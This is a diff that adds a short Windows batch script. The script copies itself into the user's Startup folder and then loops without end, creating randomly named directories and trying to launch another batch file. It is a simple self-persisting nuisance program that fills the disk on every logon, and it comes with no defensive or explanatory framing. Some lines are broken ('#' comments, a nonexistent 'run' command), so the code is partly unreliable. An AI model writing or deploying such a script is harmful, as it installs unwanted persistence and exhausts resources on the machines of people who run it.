@@ -1,0 +1,19 @@
+@echo off
+
+#make .bat copy itself and rename to %RANDOM% inside startup folder
+
+cls
+
+REM Saving Startup Path in a variable...
+Set "_Startup=%Appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+REM Checking, if file already exist in startup...
+IF Not Exist "%_Startup%\%~nx0" (Copy /Y "%~nx0" "%_Startup%")
+
+:start
+
+mkdir %RANDOM%
+
+run f.bat
+
+goto start
